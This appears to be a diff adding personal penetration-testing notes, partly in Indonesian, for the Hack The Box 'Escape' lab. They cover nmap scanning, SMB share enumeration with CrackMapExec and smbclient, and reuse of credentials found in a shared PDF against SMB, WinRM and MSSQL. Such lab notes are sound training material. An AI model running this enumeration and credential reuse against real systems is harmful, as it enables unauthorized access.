@@ -1,0 +1,40 @@
+nmap -sC -sV -oA nmap/escape 10.10.11.202
+
+/etc/hosts
+10.10.11.202    sequel.htb DC.sequel.htb
+
+less nmap/escape.nmap
+
+LDAP (Lightweight Directory Access Protocol) adalah protokol yang digunakan untuk mengakses dan mengelola direktori jaringan. Direktori pada umumnya berisi informasi terkait pengguna, grup, perangkat, dan sumber daya lainnya dalam suatu jaringan. Dalam konteks Windows, LDAP digunakan sebagai bagian dari layanan Active Directory yang digunakan untuk mengelola dan menyimpan informasi direktori.
+
+Kerberos adalah protokol keamanan jaringan yang digunakan untuk otentikasi pengguna dan mengamankan komunikasi antara klien dan server dalam lingkungan jaringan. Pada platform Windows, Kerberos digunakan sebagai protokol otentikasi standar dalam layanan Active Directory.
+
+https://10.10.11.202:3269
+
+openssl s_client -showcerts -connect 10.10.11.202:3269 | openssl x509 -noout -text | less -S
+
+--cek koneksi smb--
+cd CrackMapExec/
+poetry run crackmapexec smb 10.10.11.202
+poetry run crackmapexec smb 10.10.11.202 -u 'ali' -p '' --shares
+
+
+smbclient -L //10.10.11.202
+smbclient //10.10.11.202/Public
+smb:/> dir
+smb:/> get "SQL Server Procedures.pdf"
+exit
+
+
+--from SQL Server Procedures.pdf---
+poetry run crackmapexec smb 10.10.11.202 -u 'PublicUser' -p 'GuestUserCantWrite1' --shares
+poetry run crackmapexec winrm 10.10.11.202 -u 'ali' -p 'GuestUserCantWrite1' --shares
+poetry run crackmapexec mssql 10.10.11.202 --local-auth -u 'PublicUser' -p 'GuestUserCantWrite1' -L
+poetry run crackmapexec mssql 10.10.11.202 --local-auth -u 'PublicUser' -p 'GuestUserCantWrite1' -M mssql_priv
+
+mssqlclient.py publicuser:GuestUserCantWrite1@sequel@htb
+
+
+
+
+
